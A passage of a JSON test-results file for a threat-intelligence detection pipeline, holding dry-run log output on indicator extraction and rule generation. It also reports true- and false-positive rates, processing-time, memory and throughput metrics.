   ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:14:08 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:14:08 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:14:08 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:14:08 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:14:08 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:14:08 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:14:08 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:14:08 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:14:08 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:14:08 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:14:08 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:14:08 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:14:08 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:14:08 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:14:08 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201408\n2025-08-18 20:14:08 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:14:08 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:14:08 [debug    ] Enhanced IOC extraction completed context=administrative extraction_time=0.001s iocs_found=5 log_hash=d1dd9ff6671e4c0792553036e7292989\n2025-08-18 20:14:09 [debug    ] VirusTotal rate limiting       sleep_time=14.095275640487671\n2025-08-18 20:14:24 [debug    ] VirusTotal rate limiting       sleep_time=14.023892164230347\n2025-08-18 20:14:38 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:14:38 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\sfc.exe threat_level=medium\n2025-08-18 20:14:38 [debug    ] VirusTotal rate limiting       sleep_time=14.99787712097168\n2025-08-18 20:14:53 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:14:53 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=medium\n2025-08-18 20:14:53 [debug    ] VirusTotal rate limiting       sleep_time=14.998661279678345\n2025-08-18 20:15:08 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:15:08 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5a44aedc31454c9fb88101e56d70881f new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:15:08 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5c6b24984bd5483480ef21cf4a8f7c87 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 5\n  \u2022 Findings generated: 2\n  \u2022 Rules generated: 2\n  \u2022 Processing time: 60.063s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: sfc.exe (confidence: 0.40)\n  \u2022 IOCType.DOMAIN: cmd.exe (confidence: 0.40)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\sfc.exe (confidence: 0.40)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\cmd.exe (confidence: 0.40)\n  \u2022 IOCType.PROCESS_NAME: cmd.exe (confidence: 0.40)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    }
  ],
  "analysis": {
    "detection_effectiveness": {
      "true_positive_rate": 0.75,
      "false_positive_rate": 0.4,
      "total_malicious_tests": 16,
      "total_benign_tests": 5,
      "malicious_detected": 12,
      "benign_flagged": 2
    },
    "classification_accuracy": {
      "average_confidence": 0.899537037037037,
      "median_confidence": 0.9500000000000001,
      "confidence_std_dev": 0.13068750098805657,
      "classification_distribution": {
        "suspicious": 59,
        "malicious": 49,
        "benign": 0
      },
      "total_classifications": 108
    },
    "performance_metrics": {
      "average_processing_time": 74.90988394192287,
      "median_processing_time": 75.41151404380798,
      "max_processing_time": 165.52580738067627,
      "min_processing_time": 0.41051721572875977,
      "average_memory_delta_mb": 0.023809523809523808,
      "total_successful_tests": 21,
      "total_failed_tests": 0
    },
    "false_positive_analysis": {
      "false_positive_count": 2,
      "false_positive_rate": 0.4,
      "false_positive_patterns": {
        "suspicious": 2
      },
      "total_benign_tests": 5
    },
    "rule_quality_assessment": {
      "total_rules_generated": 86,
      "total_findings": 111,
      "overall_rule_efficiency": 0.7747747747747747,
      "average_efficiency": 0.8388528138528139,
      "rules_per_test": 4.095238095238095
    },
    "comparison_with_baseline": {
      "baseline_memory_mb": 25.89,
      "current_memory_mb": 27.11,
      "memory_increase_mb": 1.2199999999999989,
      "baseline_ioc_count": 13,
      "current_ioc_count": 13,
      "system_resources": {
        "cpu_cores": "Unknown",
        "memory_gb": "Unknown",
        "platform": "Unknown",
        "error": "module 'psutil' has no attribute 'platform'"
      }
    }
  },
  "performance_tests": {
    "concurrent_processing": {
      "total_time": 289.6176760196686,
      "files_processed": 5,
      "throughput": 0.01726413963649249,
      "memory_delta_mb": 0.129999999999999,
      "peak_memory_mb": 27.36,
      "avg_cpu_usage": 33.85
    },
    "memory_usage": {
      "baseline_memory_mb": 27.36,
      "peak_memory_mb": 27.36,
      "memory_increase_mb": 0.0,
      "processing_time": 90.49156284332275
    },
    "throughput": {
      "total_files": 10,
      "processed_successfully": 10,
      "total_time": 409.61412525177,
      "throughput_files_per_second": 0.024413220598419265,
      "success_rate": 1.0
    },
    "scalability": [
      {
        "file_count": 1,
        "processing_time": 0.32248449325561523,
        "memory_usage_mb": 27.36,
        "memory_delta_mb": 0.0
      },
      {
        "file_count": 5,
        "processing_time": 122.59010577201843,
        "memory_usage_mb": 27.36,
        "memory_delta_mb": 0.0
      },
      {
        "file_count": 10,
        "processing_time": 410.0787708759308,
        "memory_usage_mb": 27.36,
        "memory_delta_mb": 0.0
      }
    ]
  }
}